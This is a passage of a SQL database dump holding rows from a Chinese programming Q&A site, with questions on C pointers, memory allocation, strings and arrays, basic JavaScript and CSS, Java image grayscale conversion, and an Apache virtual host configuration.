}         \r\n    return pix;  \r\n}     \r\n\r\n</code></pre>\r\n\r\n<p>&nbsp; &nbsp; 这段代码中pix[i] = 255 &lt;&lt; 24|gray &lt;&lt; 16|gray &lt;&lt; 8|gray是什么意思？</p>\r\n',1,0,'用JAVA将彩色图像变为灰度图像',148,NULL,0,NULL,0),(58,0,'20150520084654',2,'<pre>\r\n<code>char a[10];\r\nint i;\r\nfor (i = 0; i &lt; 10; i++)\r\n    scanf_s(\"%c\",&amp;a[i]);\r\nprintf(\"%s\",a);//我打10个字符以上后就会输出一些随机的数字，为什么啊？</code></pre>\r\n',1,0,'C语言字符输出问题',185,NULL,0,NULL,0),(59,0,'20150627224456',14,'<p>char *ch = &quot;abc&quot;;</p>\r\n\r\n<p>ch[0] = &#39;a&#39;;</p>\r\n\r\n<p>这个语句为什么不能赋值？</p>\r\n\r\n<p>字符数组和字面值字符串在C中和OC中的存储方式有什么不一样？</p>\r\n',0,0,'关于字符串指针问题',98,NULL,0,NULL,0),(60,0,'20150702115251',15,'<p>配置文件如下</p>\r\n\r\n<pre>\r\n<code class=\"language-apache\">&lt;VirtualHost *:80&gt;\r\n        ServerName bmc.boful.com\r\n        JkLogFile logs/mod_jk.log\r\n        JkLogLevel info\r\n        # Select the log format\r\n        JkLogStampFormat \"[%a %b %d %H:%M:%S %Y]\"\r\n        # JkOptions indicate to send SSL KEY SIZE,\r\n        JkOptions +ForwardKeySize +ForwardURICompat -ForwardDirectories\r\n        # JkRequestLogFormat set the request format\r\n        JkRequestLogFormat \"%w %V %T\"\r\n        #JkMount /* worker1\r\n        JkMount /bmc worker1\r\n        JkMount /bmc/* worker1\r\n        #JkMount /nts worker1\r\n        #JkMount /nts/* worker1\r\n&lt;/VirtualHost&gt;</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'apache 配置多个域名，为啥不好使呢？',131,NULL,0,NULL,0),(61,0,'20150710184608',2,'',1,0,'python中文乱码怎么办',128,54,0,'/upload/question/61/8b29c2a3-1e9f-4cf2-aa45-95078512e4dd.jpg',97),(62,0,'20150712123340',2,'',0,0,'js怎么定义一个对象',113,NULL,0,NULL,0),(63,0,'20150712123845',2,'',0,0,'js怎么定义一个对象',70,NULL,0,NULL,0),(64,0,'20150712124229',2,'<p>能不能像java里的SimpleDateFormat这样的功能,</p>\r\n',0,0,'js日期如何格式化',105,NULL,0,NULL,0),(65,0,'20150712125437',2,'',0,0,'js如何获取地址栏地址',97,NULL,0,NULL,0),(66,0,'20150712125556',2,'',0,0,'js如何控制页面跳转',107,NULL,0,NULL,0),(67,0,'20150713072115',2,'',0,0,'css的margin和padding指的是什么',140,NULL,0,NULL,0),(68,0,'20150713072214',2,'',0,0,'css的position几个属性到底什么意思',92,NULL,0,NULL,0),(69,0,'20150713072342',2,'',0,0,'css如何垂直和水平居中',94,NULL,0,NULL,0),(70,0,'20150713080103',2,'',0,0,'求css中的float用法求解',86,NULL,0,NULL,0),(71,0,'20150713080730',2,'',0,0,'求c指针的具体使用和常用用法',89,NULL,0,NULL,0),(75,0,'20150713100326',2,'',0,0,'为什么不精确定义标准类型的大小？',43,NULL,0,NULL,0),(74,0,'20150713100325',2,'',0,0,'我该如何决定使用哪种整数类型？',33,NULL,0,NULL,0),(76,0,'20150713100326',2,'',0,0,'因为C语言没有精确定义类型的大小，所以我一般都用typedef定义int16和int32。然后根据实际的机器环境把它们定义为int、short、long等类型。这样看来，所有的问题都解决了，是吗？',56,NULL,0,NULL,0),(77,0,'20150713100326',2,'',0,0,'新的64位机上的64位类型是什么样的？',65,NULL,0,NULL,0),(78,0,'20150713100326',2,'',0,0,'这样的声明有什么问题？char*p1,p2;我在使用p2的时候报错了。',47,NULL,0,NULL,0),(79,0,'20150713100326',2,'',0,0,'我想声明一个指针，并为它分配一些空间，但却不行。这样的代码有什么问题？char*p;*p=malloc(10);',50,NULL,0,NULL,0),(80,0,'20150713100326',2,'',0,0,'怎样声明和定义全局变量和函数最好？',38,NULL,0,NULL,0),(81,0,'20150713100327',2,'',0,0,'如何在C中实现不透明(抽象)数据类型？',49,NULL,0,NULL,0),(82,0,'20150713100327',2,'',0,0,'如何生成“半全局变量”，就是那种只能被部分源文件中的部分函数访问的变量？',55,NULL,0,NULL,0),(83,0,'20150713100327',2,'',0,0,'同一个静态(static)函数或变量的所有声明都必需包含static存储类型吗？',19,NULL,0,NULL,0),(84,0,'20150713100327',2,'',0,1,'extern在函数声明中是什么意思？',13,NULL,0,NULL,0),(85,0,'20150713100327',2,'',0,1,'关键字auto到底有什么用途？',16,NULL,0,NULL,0),(86,0,'20150713100328',2,'',0,1,'对于用户定义类型，typedef和#define有什么区别？',18,NULL,0,NULL,0),(87,0,'20150713100328',2,'',0,1,'我似乎不能成功定义一个链表。我试过typedefstruct{char*item;NODEPTRnext;}*NODEPTR;但是编译器报了错误信息。难道在C语言中结构不能包含指向自己的指针吗？',12,NULL,0,NULL,0),(88,0,'20150713100328',2,'',0,1,'如何定义一对相互引用的结构？',15,NULL,0,NULL,0),(89,0,'20150713100328',2,'',0,1,'Struct{　}x1;和typedefstruct{　}x2;这两个声明有什么区别？',16,NULL,0,NULL,0),(90,0,'20150713100328',2,'',0,1,'“typedefint(*funcptr)();”是什么意思？',21,NULL,0,NULL,0),(91,0,'20150713100329',2,'',0,1,'我有这样一组声明：typedefchar*charp;constcharpp;为什么是p而不是它指向的字符为const?',13,NULL,0,NULL,0),(92,0,'20150713100329',2,'',0,1,'为什么不能像下面这样在初始式和数组维度值中使用const值？constintn=5;inta[n];',15,NULL,0,NULL,0),(93,0,'20150713100329',2,'',0,1,'constchar*p、charconst*p和char*constp有什么区别？',17,NULL,0,NULL,0),(94,0,'20150713100329',2,'',0,1,'怎样建立和理解非常复杂的声明？例如定义一个包含N个指向返回指向字符的指针的函数的指针的数组？',16,NULL,0,NULL,0),(95,0,'20150713100329',2,'',0,1,'如何声明返回指向同类型函数的指针的函数?我在设计一个状态机，用函数表示每种状态，每个函数都会返回一个指向下一个状态的函数的指针。可我找不到任何方法来声明这样的函数——感觉我需要一个返回指针的函数，返回的指针指向的又是返回指针的函数……，如此往复，以至无穷。',12,NULL,0,NULL,0),(96,0,'20150713100330',2,'',0,1,'能否声明和传入数组大小一致的局部数组，或者由其他参数指定大小的参数数组？',11,NULL,0,NULL,0),(97,0,'20150713100330',2,'',0,1,'我在一个文件中定义了一个extern数组，然后在另一个文件中使用，为什么sizeof取不到数组的大小？',10,NULL,0,NULL,0),(98,0,'20150713100330',2,'',0,1,'函数只定义了一次，调用了一次，但编译器提示非法重声明了。',5,NULL,0,NULL,0),(99,0,'20150713100330',2,'',0,1,'main的正确定义是什么？voidmain正确吗？',11,NULL,0,NULL,0),(100,0,'20150713100331',2,'',0,1,'我的编译器总在报函数原型不匹配的错误，可我觉得没什么问题。这是为什么？',13,NULL,0,NULL,0),(101,0,'20150713100331',2,'',0,1,'文件中的第一个声明就报出奇怪的语法错误，可我看没什么问题。这是为什么？',13,NULL,0,NULL,0),(102,0,'20150713100331',2,'',0,1,'为什么我的编译器不允许我定义大数组，如doublearray[][]?',15,NULL,0,NULL,0),(103,0,'20150713100331',2,'',0,1,'如何判断哪些标识符可以使用，哪些被保留了？',11,NULL,0,NULL,0),(104,0,'20150713100331',2,'',0,1,'对于没有显式初始化的变量的初始值可以作怎样的假定？如果一个全局变量初始值为“零”，它可否作为空指针或浮点零？',11,NULL,0,NULL,0),(105,0,'20150713100332',2,'',0,1,'下面的代码为什么不能编译?intf(){chara[]=\"Hello,world!\";}',13,NULL,0,NULL,0),(106,0,'20150713100332',2,'',0,1,'下面的初始化有什么问题？编译器提示“invalidinitializers”或其他信息。char*p=malloc(10);',16,NULL,0,NULL,0),(107,0,'20150713100332',2,'',0,1,'chara[]=\"stringliteral\";和char*p=\"stringliteral\";初始化有什么区别？当我向p[i]赋值的时候，我的程序崩溃了。',14,NULL,0,NULL,0),(108,0,'20150713100332',2,'',0,1,'chara{[3]}=\"abc\";是否合法？',13,NULL,0,NULL,0),(109,0,'20150713100332',2,'',0,1,'我总算弄清楚函数指针的声明方法了，但怎样才能初始化呢？',11,NULL,0,NULL,0),(110,0,'20150713100333',2,'',0,1,'能够初始化联合吗？',9,NULL,0,NULL,0),(111,0,'20150713100333',2,'',0,1,'structx1{　};和typedefstruct{　}x2;有什么不同？',15,NULL,0,NULL,0),(112,0,'20150713100333',2,'',0,1,'这样的代码为什么不对？structx{　};xthestruct;',13,NULL,0,NULL,0),(113,0,'20150713100333',2,'',0,1,'结构可以包含指向自己的指针吗？',14,NULL,0,NULL,0),(114,0,'20150713100333',2,'',0,1,'在C语言中用什么方法实现抽象数据类型最好?',14,NULL,0,NULL,0),(115,0,'20150713100334',2,'',0,1,'在C语言中是否有模拟继承等面向对象程序设计特性的好方法？',15,NULL,0,NULL,0),(116,0,'20150713100334',2,'',0,1,'为什么声明externf(structx*p);给我报了一个晦涩难懂的警告信息？',6,NULL,0,NULL,0),(117,0,'20150713100334',2,'',0,1,'我遇到这样声明结构的代码：structname{intnamelen;charnamestr[1];};然后又使用一些内存分配技巧使namestr数组用起来好像有多个元素，namelen记录了元素个数。它是怎样工作的？这样是合法的和可移植的吗？',14,NULL,0,NULL,0),(118,0,'20150713100334',2,'',0,1,'我听说结构可以赋给变量也可以对函数传入和传出。为什么K&R1却明确说明不能这样做？',10,NULL,0,NULL,0),(119,0,'20150713100334',2,'',0,1,'为什么不能用内建的==和!=操作符比较结构？',11,NULL,0,NULL,0),(120,0,'20150713100335',2,'',0,1,'结构传递和返回是如何实现的？',16,NULL,0,NULL,0),(121,0,'20150713100335',2,'',0,1,'如何向接受结构参数的函数传入常量值？怎样创建无名的中间的常量结构值？',12,NULL,0,NULL,0),(122,0,'20150713100335',2,'',0,1,'怎样从/向数据文件读/写结构？',12,NULL,0,NULL,0),(123,0,'20150713100335',2,'',0,1,'为什么我的编译器在结构中留下了空洞？这导致空间浪费而且无法与外部数据文件进行“二进制”读写。能否关掉填充，或者控制结构域的对齐方式？',11,NULL,0,NULL,0),(124,0,'20150713100335',2,'',0,1,'为什么sizeof返回的值大于结构大小的期望值，是不是尾部有填充？',13,NULL,0,NULL,0),(125,0,'20150713100336',2,'',0,1,'如何确定域在结构中的字节偏移量？',19,NULL,0,NULL,0),(126,0,'20150713100336',2,'',0,1,'怎样在运行时用名字访问结构中的域？',14,NULL,0,NULL,0),(127,0,'20150713100336',2,'',0,1,'C语言中有和Pascal的with等价的语句吗？',13,NULL,0,NULL,0),(128,0,'20150713100336',2,'',0,1,'既然数组名可以用作数组的基地址，为什么对结构不能这样？',13,NULL,0,NULL,0),(129,0,'20150713100337',2,'',0,1,'程序运行正确，但退出时却“coredump”(核心转储)了，怎么回事？',15,NULL,0,NULL,0),(130,0,'20150713100337',2,'',0,1,'结构和联合有什么区别？',13,NULL,0,NULL,0),(131,0,'20150713100337',2,'',0,1,'有办法初始化联合吗？',13,NULL,0,NULL,0),(132,0,'20150713100337',2,'',0,1,'有没有一种自动方法来跟踪联合的哪个域在使用？',22,NULL,0,NULL,0),(133,0,'20150713100337',2,'',0,1,'枚举和一组预处理的#define有什么不同？',9,NULL,0,NULL,0),(134,0,'20150713100338',2,'',0,1,'枚举可移植吗？',1,NULL,0,NULL,0),(135,0,'20150713100338',2,'',0,1,'有什么显示枚举值符号的容易方法吗？',9,NULL,0,NULL,0),(136,0,'20150713100338',2,'',0,1,'一些结构声明中的这些冒号和数字是什么意思？',19,NULL,0,NULL,0),(137,0,'20150713100338',2,'',0,1,'为什么人们那么喜欢用显式的掩码和位操作而不直接声明位域？',16,NULL,0,NULL,0),(138,0,'20150713100338',2,'',0,1,'为什么这样的代码不行？a[i]=i++;',8,NULL,0,NULL,0),(139,0,'20150713100338',2,'',0,1,'使用我的编译器，下面的代码inti=7;printf(\"%d\\n\",i++*i++);打印出49。不管按什么顺序计算，难道不该是56吗？',11,NULL,0,NULL,0),(140,0,'20150713100339',2,'',0,1,'对于代码inti=3;i=i++;不同编译器给出不同的i值，有的为3，有的为4，哪个是正确的？',10,NULL,0,NULL,0),(141,0,'20150713100339',2,'',0,1,'有这样一个巧妙的表达式：a^=b^=a^=b;它不需要临时变量就可以交换a和b的值。',8,NULL,0,NULL,0),(142,0,'20150713100339',2,'',0,1,'可否用显式括号来强制执行我所需要的计算顺序并控制相关的副作用？就算括号不行，操作符优先级是否能够控制计算顺序呢？',13,NULL,0,NULL,0),(143,0,'20150713100339',2,'',0,1,'可是&&和||操作符呢？我看到过类似while((c=getchar())!=EOF&&c!=\'\\n\')的代码……',16,NULL,0,NULL,0),(144,0,'20150713100340',2,'',0,1,'是否可以安全地认为，一旦&&和||左边的表达式已经决定了整个表达式的结果，则右边的表达式不会被求值？',14,NULL,0,NULL,0),(145,0,'20150713100340',2,'',0,1,'为什么表达式printf(\"%d%d\",f1(),f2());先调用了f2？我觉得逗号表达式应该确保从左到右的求值顺序。',15,NULL,0,NULL,0),(146,0,'20150713100340',2,'',0,1,'怎样才能理解复杂表达式并避免写出未定义的表达式？“序列点”是什么？',19,NULL,0,NULL,0),(147,0,'20150713100340',2,'',0,1,'在a[i]=i++;中，如果不关心a[]的哪一个分量会被写入，这段代码就没有问题，i也的确会增加1，对吗？',11,NULL,0,NULL,0),(148,0,'20150713100340',2,'',0,1,'人们总是说i=i++的行为是未定义的。可我刚刚在一个ANSI编译器上尝试过，其结果正如我所期望的。',13,NULL,0,NULL,0),(149,0,'20150713100341',2,'',0,1,'我不想学习那些复杂的规则，怎样才能避免这些未定义的求值顺序问题呢？',10,NULL,0,NULL,0),(150,0,'20150713100341',2,'',0,1,'++i和i++有什么区别？',14,NULL,0,NULL,0),(151,0,'20150713100341',2,'',0,1,'如果我不使用表达式的值，那我应该用i++还是++i来做自增呢？',15,NULL,0,NULL,0),(152,0,'20150713100341',2,'',0,1,'我要检查一个数是不是在另外两个数之间，为什么if(abc)不行？',17,NULL,0,NULL,0),(153,0,'20150713100341',2,'',0,1,'为什么如下的代码不对？inta=,b=;longintc=a*b;',6,NULL,0,NULL,0),(154,0,'20150713100341',2,'',0,1,'为什么下面的代码总是给出0？doubledegC,degF;degC=/9*(degF-32);',13,NULL,0,NULL,0),(155,0,'20150713100342',2,'',0,1,'需要根据条件把一个复杂的表达式赋给两个变量中的一个。可以用下面这样的代码吗？((condition)?a:b)=complicated_expression;',11,NULL,0,NULL,0),(156,0,'20150713100342',2,'',0,1,'我有些代码包含这样的表达式。a?b=c:d有些编译器可以接受，有些却不能。为什么？',17,NULL,0,NULL,0),(157,0,'20150713100342',2,'',0,1,'“semanticsof‘’changeinANSIC”的警告是什么意思？',26,NULL,0,NULL,0),(158,0,'20150713100342',2,'',0,1,'“无符号保护”和“值保护”规则的区别在哪里？',8,NULL,0,NULL,0),(159,0,'20150713100343',2,'',0,1,'指针到底有什么好处？',23,NULL,0,NULL,0),(160,0,'20150713100343',2,'',0,1,'我想声明一个指针并为它分配一些空间，但却不行。这些代码有什么问题呢？char*p;*p=malloc(10);',16,NULL,0,NULL,0),(161,0,'20150713100343',2,'',0,1,'*p++自增p还是p所指向的变量？',12,NULL,0,NULL,0),(162,0,'20150713100343',2,'',0,1,'我用指针操作int数组的时候遇到了麻烦。',6,NULL,0,NULL,0),(163,0,'20150713100343',2,'',0,1,'我有一个char*型指针碰巧指向一些int型变量，我想跳过它们。为什么((int*)p)++;这样的代码不行？',11,NULL,0,NULL,0),(164,0,'20150713100344',2,'',0,1,'为什么不能对void*指针进行算术操作？',11,NULL,0,NULL,0),(165,0,'20150713100344',2,'',0,1,'我有些解析外部结构的代码，但是它却崩溃了，显示出了“unalignedaccess”(未对齐的访问)的信息。这是什么意思？',13,NULL,0,NULL,0),(166,0,'20150713100344',2,'',0,1,'我有个函数，它应该接受并初始化一个指针：voidf(int*ip){staticintdummy=5;ip=&dummy;}但是当我如下调用时：int*ip;f(ip);调用者的指针没有任何变化。',10,NULL,0,NULL,0),(167,0,'20150713100344',2,'',0,1,'能否用void**通用指针作为参数，使函数模拟按引用传递参数?',10,NULL,0,NULL,0),(168,0,'20150713100344',2,'',0,1,'我有一个函数externintf(int*);，它接受指向int型的指针。我怎样用引用方式传入一个常数？调用f(&5);似乎不行。',16,NULL,0,NULL,0),(169,0,'20150713100405',2,'',0,1,'C语言可以“按引用传参”吗？',17,NULL,0,NULL,0),(170,0,'20150713100406',2,'',0,1,'我看到了用指针调用函数的不同语法形式。到底怎么回事？',13,NULL,0,NULL,0),(171,0,'20150713100406',2,'',0,1,'通用指针类型是什么？当我把函数指针赋向void*类型的时候，编译通不过。',10,NULL,0,NULL,0),(172,0,'20150713100406',2,'',0,1,'怎样在整型和指针之间进行转换？能否暂时把整数放入指针变量中，或者相反？',14,NULL,0,NULL,0),(173,0,'20150713100406',2,'',0,1,'我怎样把一个int变量转换为char*型？我试了类型转换，但是不行。',14,NULL,0,NULL,0),(174,0,'20150713100407',2,'',0,1,'臭名昭著的空指针到底是什么？',21,NULL,0,NULL,0),(175,0,'20150713100407',2,'',0,1,'怎样在程序里获得一个空指针？',15,NULL,0,NULL,0),(176,0,'20150713100407',2,'',0,1,'用缩写的指针比较“if(p)”检查空指针是否有效？如果空指针的内部表达不是0会怎样？',11,NULL,0,NULL,0),(177,0,'20150713100407',2,'',0,1,'NULL是什么，它是怎么定义的？',36,NULL,0,NULL,0),(178,0,'20150713100408',2,'',0,1,'在使用非零位模式作为空指针的内部表示的机器上，NULL是如何定义的？',38,NULL,0,NULL,0),(179,0,'20150713100408',2,'',0,1,'如果NULL定义成#defineNULL((char*)0)，不就可以向函数传入不加转换的NULL了吗？',31,NULL,0,NULL,0),(180,0,'20150713100408',2,'',0,1,'我的编译器提供的头文件中定义的NULL为0L。为什么？',33,NULL,0,NULL,0),(181,0,'20150713100408',2,'',0,1,'NULL可以合法地用作函数指针吗？',44,NULL,0,NULL,0),(182,0,'20150713100409',2,'',0,1,'如果NULL和0作为空指针常量是等价的，那我到底该用哪一个呢？',32,NULL,0,NULL,0),(183,0,'20150713100409',2,'',0,1,'但是如果NULL的值改变了，比如在使用非零内部空指针的机器上，用NULL(而不是0)',30,NULL,0,NULL,0),(184,0,'20150713100409',2,'',0,1,'我曾经使用过一个编译器，不使用NULL就不能编译。',30,NULL,0,NULL,0),(185,0,'20150713100409',2,'',0,1,'我用预处理宏#defineNullptr(type)(type*)0帮助创建正确类型的空指针。',27,NULL,0,NULL,0),(186,0,'20150713100409',2,'',0,1,'这有点奇怪：NULL可以确保是0，但空(null)指针却不一定？',35,NULL,0,NULL,0),(187,0,'20150713100410',2,'',0,1,'为什么有那么多关于空指针的疑惑？为什么这些问题如此频繁地出现？',20,NULL,0,NULL,0),(188,0,'20150713100410',2,'',0,1,'有没有什么简单点儿的办法理解所有这些与空指针有关的东西呢？',22,NULL,0,NULL,0),(189,0,'20150713100410',2,'',0,1,'考虑到有关空指针的所有这些困惑，要求它们的内部表示都必须为0不是更简单吗？',17,NULL,0,NULL,0),(190,0,'20150713100410',2,'',0,1,'说真的，真有机器用非零空指针吗，或者不同类型用不同的表示？',11,NULL,0,NULL,0),(191,0,'20150713100410',2,'',0,1,'运行时的整数值0转换为指针以后一定是空指针吗？',14,NULL,0,NULL,0),(192,0,'20150713100411',2,'',0,1,'如何访问位于机器地址0处的中断向量？如果我将指针值设为0，编译器可能会自动将它转换为非零的空指针内部表示。',16,NULL,0,NULL,0),(193,0,'20150713100411',2,'',0,1,'运行时的“nullpointerassignment”错误是什么意思？应该怎样捕捉它？',35,NULL,0,NULL,0),(194,0,'20150713100411',2,'',0,1,'我在一个源文件中定义了chara[6]，在另一个源文件中声明了externchar*a。为什么不行？',18,NULL,0,NULL,0),(195,0,'20150713100411',2,'',0,1,'可是我听说chara[]和char*a是等价的。是这样的吗？',12,NULL,0,NULL,0),(196,0,'20150713100411',2,'',0,1,'那么，在C语言中“指针和数组等价”到底是什么意思？',18,NULL,0,NULL,0),(197,0,'20150713100412',2,'',0,1,'既然它们这么不同，那为什么作为函数形参的数组和指针声明可以互换呢？',11,NULL,0,NULL,0),(198,0,'20150713100412',2,'',0,1,'为什么不能这样向数组赋值？externchar*getpass();charstr[10];str=getpass(\"Enterpassword:\");',11,NULL,0,NULL,0),(199,0,'20150713100412',2,'',0,1,'既然不能向数组赋值，那这段代码为什么可以呢？intf(charstr[]){if(str[0]==\'\\0\')str=\"none\";…}',10,NULL,0,NULL,0),(200,0,'20150713100412',2,'',0,1,'如果你不能给它赋值，那么数组如何能成为左值呢？',10,NULL,0,NULL,0),(201,0,'20150713100412',2,'',0,1,'现实地讲，数组和指针的区别是什么？',22,NULL,0,NULL,0),(202,0,'20150713100412',2,'',0,1,'有人跟我讲，数组不过是常指针。这样讲准确吗？',15,NULL,0,NULL,0),(203,0,'20150713100434',2,'',0,1,'我还是很困惑。到底指针是一种数组，还是数组是一种指针？',11,NULL,0,NULL,0),(204,0,'20150713100434',2,'',0,1,'我看到一些“搞笑”的代码，包含5[\"abcdef\"]这样的“表达式”。这为什么是合法的C语言表达式呢？',15,NULL,0,NULL,0),(205,0,'20150713100434',2,'',0,1,'既然数组引用会退化为指针，如果array是数组，那么array和&array又有什么区别呢？',16,NULL,0,NULL,0),(206,0,'20150713100434',2,'',0,1,'如何声明一个数组的指针？',14,NULL,0,NULL,0),(207,0,'20150713100434',2,'',0,1,'如何在运行时设定数组的大小？怎样才能避免固定大小的数组？',12,NULL,0,NULL,0),(208,0,'20150713100434',2,'',0,1,'我如何声明大小和传入的数组一样的局部数组？',11,NULL,0,NULL,0),(209,0,'20150713100435',2,'',0,1,'如何动态分配多维数组？',10,NULL,0,NULL,0),(210,0,'20150713100435',2,'',0,1,'有个很好的窍门，如果我这样写：intrealarray[10];int*array=&realarray[-1];我就可以把“array”当作下标从1　开始的数组。',11,NULL,0,NULL,0),(211,0,'20150713100435',2,'',0,1,'当我向一个接受指针的指针的函数传入二维数组的时候，编译器报错了。',9,NULL,0,NULL,0),(212,0,'20150713100435',2,'',0,1,'我怎样编写接受编译时宽度未知的二维数组的函数？',13,NULL,0,NULL,0),(213,0,'20150713100435',2,'',0,1,'我怎样在函数参数传递时混用静态和动态多维数组？',14,NULL,0,NULL,0),(214,0,'20150713100436',2,'',0,1,'当数组是函数的参数时，为什么sizeof不能正确报告数组的大小？',17,NULL,0,NULL,0),(215,0,'20150713100436',2,'',0,1,'如何在一个文件中判断声明为extern的数组的大小(例如，数组定义和大小在另一个文件中)？sizeof操作符似乎不行。',13,NULL,0,NULL,0),(216,0,'20150713100436',2,'',0,1,'sizeof返回的大小是以字节计算的，怎样才能判断数组中有多少个元素呢？',12,NULL,0,NULL,0),(217,0,'20150713100436',2,'',0,1,'为什么这段代码不行？char*answer;printf(\"Typesomething:\\n\");gets(answer);printf(\"Youtyped\\\"%s\\\"\\n\",answer);',9,NULL,0,NULL,0),(218,0,'20150713100436',2,'',0,1,'我的strcat()不行。我试了下面的代码：char*s1=\"Hello,\";char*s2=\"world!\";char*s3=strcat(s1,s2);但是我得到了奇怪的结果。',10,NULL,0,NULL,0),(219,0,'20150713100437',2,'',0,1,'但是strcat的文档说它接受两个char*型参数。我怎么知道(空间)分配的事情呢？',15,NULL,0,NULL,0),(220,0,'20150713100437',2,'',0,1,'我刚才试了这样的代码：char*p;strcpy(p,\"abc\");它运行正常。怎么回事？为什么它没有出错？',16,NULL,0,NULL,0),(221,0,'20150713100437',2,'',0,1,'一个指针变量分配多少内存？',8,NULL,0,NULL,0),(222,0,'20150713100437',2,'',0,1,'我使用fgets将文件的所有行读入一个数组，为什么读入的每一行都是最后一行的内容呢？',12,NULL,0,NULL,0),(223,0,'20150713100437',2,'',0,1,'我有个函数，本该返回一个字符串，但当它返回调用者的时候，返回的字符串却是垃圾信息。',15,NULL,0,NULL,0),(224,0,'20150713100438',2,'',0,1,'那么返回字符串或其他聚集的正确方法是什么呢？',13,NULL,0,NULL,0),(225,0,'20150713100438',2,'',0,1,'为什么在调用malloc()时报出了“waring:assignmentofpointerfromintegerlacksacast”？',9,NULL,0,NULL,0),(226,0,'20150713100438',2,'',0,1,'为什么有些代码小心翼翼地把malloc返回的值转换为分配的指针类型？',13,NULL,0,NULL,0),(227,0,'20150713100438',2,'',0,1,'在调用malloc()的时候，错误“不能把void*转换为int*”是什么意思？',18,NULL,0,NULL,0),(228,0,'20150713100438',2,'',0,1,'我看到下面这样的代码：char*p=malloc(strlen(s)+1);strcpy(p,s);难道不应该是malloc((strlen(s)+1)*sizeof(char))吗？',7,NULL,0,NULL,0),(229,0,'20150713100439',2,'',0,1,'我为malloc写了一个小小的封装函数。它为什么不行？',11,NULL,0,NULL,0),(230,0,'20150713100439',2,'',0,1,'我想声明一个指针并向它分配一些内存，但是不行。这样的代码有什么问题？char*p;*p=malloc(10);',13,NULL,0,NULL,0),(231,0,'20150713100439',2,'',0,1,'我如何动态分配数组？',14,NULL,0,NULL,0),(232,0,'20150713100439',2,'',0,1,'怎样判断还有多少内存？',12,NULL,0,NULL,0),(233,0,'20150713100439',2,'',0,1,'malloc(0)是返回空指针还是指向0个字节的指针？',13,NULL,0,NULL,0),(234,0,'20150713100440',2,'',0,1,'我听说有的操作系统在程序使用的时候才真正分配malloc申请的内存。这合法吗？',16,NULL,0,NULL,0),(235,0,'20150713100440',2,'',0,1,'为什么malloc返回了离谱的指针值？我的确读过问题，而且也在调用之前包含了externvoid*malloc();声明。',12,NULL,0,NULL,0),(236,0,'20150713100440',2,'',0,1,'我用一行这样的代码分配一个巨大的数组，用于数值运算：double*array=malloc(　*　*sizeof(double));malloc()并没有返回空指针，但是程序运行得有些奇怪，好像改写了某些内存，或者malloc()并没有分配我申请的那么多内存。为什么？',8,NULL,0,NULL,0),(237,0,'20150713100440',2,'',0,1,'我的PC机有8兆内存。为什么我只能分配K左右的内存？',11,NULL,0,NULL,0),(238,0,'20150713100440',2,'',0,1,'我的应用程序非常依赖数据结构的节点的动态分配，而malloc/free的代价成了瓶颈。我该怎么做？',12,NULL,0,NULL,0),(239,0,'20150713100440',2,'',0,1,'我的程序总是崩溃，显然发生在malloc内部的某个地方。但是我看不出哪里有问题。是malloc有bug吗？',12,NULL,0,NULL,0),(240,0,'20150713100441',2,'',0,1,'动态分配的内存一旦释放之后就不能再使用，是吧？',10,NULL,0,NULL,0),(241,0,'20150713100441',2,'',0,1,'为什么在调用free()之后指针没有变空？使用(赋值、比较)释放之后的指针有多么不安全？',19,NULL,0,NULL,0),(242,0,'20150713100441',2,'',0,1,'当我调用malloc()为一个函数的局部指针分配内存时，我还需要用free()显式地释放吗？',15,NULL,0,NULL,0),(243,0,'20150713100441',2,'',0,1,'我在分配一些结构，它们包含指向其他动态分配的对象的指针。我在释放结构的时候，还需要释放每一个下级指针吗？',13,NULL,0,NULL,0),(244,0,'20150713100441',2,'',0,1,'我必须在程序退出之前释放分配的所有内存吗？',10,NULL,0,NULL,0),(245,0,'20150713100442',2,'',0,1,'我有个程序分配了大量的内存，然后又释放了。但是从操作系统看，内存的占用率却并没有变回去。',13,NULL,0,NULL,0),(246,0,'20150713100442',2,'',0,1,'free()怎么知道有多少字节需要释放？',13,NULL,0,NULL,0),(247,0,'20150713100442',2,'',0,1,'那么我能否查询malloc包，以查明可分配的最大块是多大？',12,NULL,0,NULL,0),(248,0,'20150713100442',2,'',0,1,'为什么sizeof不能告诉我它所指的内存块的大小？',16,NULL,0,NULL,0),(249,0,'20150713100442',2,'',0,1,'(像问题中那样)动态分配数组之后，还能改变它的大小吗？',10,NULL,0,NULL,0),(250,0,'20150713100443',2,'',0,1,'向realloc()的第一个参数传入空指针合法吗？你为什么要这样做？',11,NULL,0,NULL,0),(251,0,'20150713100443',2,'',0,1,'calloc()和malloc()有什么区别？应该用哪一个？利用calloc的零填充功能安全吗？free()可以释放calloc()分配的内存吗，还是需要一个cfree()？',16,NULL,0,NULL,0),(252,0,'20150713100443',2,'',0,1,'alloca是什么？为什么不提倡使用它？',15,NULL,0,NULL,0),(253,0,'20150713100443',2,'',0,1,'为什么strcat(string,\'!\');不行？',11,NULL,0,NULL,0),(254,0,'20150713100443',2,'',0,1,'我想检查一个字符串是否跟某个值匹配。为什么这样不行？if(string==\"value\")',13,NULL,0,NULL,0),(255,0,'20150713100444',2,'',0,1,'如果我可以写chara[]=\"Hello,world!\";那为什么不能写chara[14];a=\"Hello,world!\";',20,NULL,0,NULL,0),(256,0,'20150713100444',2,'',0,1,'为什么我的strcat不行？我试了char*s1=\"Hello,\";char*s2=\"world!\";char*s3　=strcat(s1,s2);可得到的结果很奇怪。',13,NULL,0,NULL,0),(257,0,'20150713100444',2,'',0,1,'chara[]=\"stringliteral\";和char*p=\"stringliteral\";初始化有什么区别？当我对p[i]赋值的时候，程序崩溃了。',15,NULL,0,NULL,0),(258,0,'20150713100444',2,'',0,1,'我怎么得到与字符相对应的数字(即ASCII或其他字符集下的)值？反过来又该怎么做？',11,NULL,0,NULL,0),(259,0,'20150713100444',2,'',0,1,'C语言有类似其他语言的\"substr\"(提取子串)这样的函数吗？',11,NULL,0,NULL,0),(260,0,'20150713100445',2,'',0,0,'我将用户键入的字符串读入数组，然后再显示出来。当用户键入\\n这样的序列时，为什么不能正确处理呢？',72,NULL,0,NULL,0),(261,0,'20150713100445',2,'',0,0,'我注意到sizeof(\'a\')是2而不是1(即不是sizeof(char))，是不是我的编译器有问题？',56,NULL,0,NULL,0),(262,0,'20150713100445',2,'',0,0,'我正开始考虑多语言字符集的问题。是否有必要担心sizeof(char)会被定义为2，以便表达16位的字符集呢？',52,NULL,0,NULL,0),(263,0,'20150713100445',2,'',0,0,'C语言中布尔值该用什么类型？为什么它不是一个标准类型？我应该用#define或enum定义真值和假值吗？',53,NULL,0,NULL,0),(264,0,'20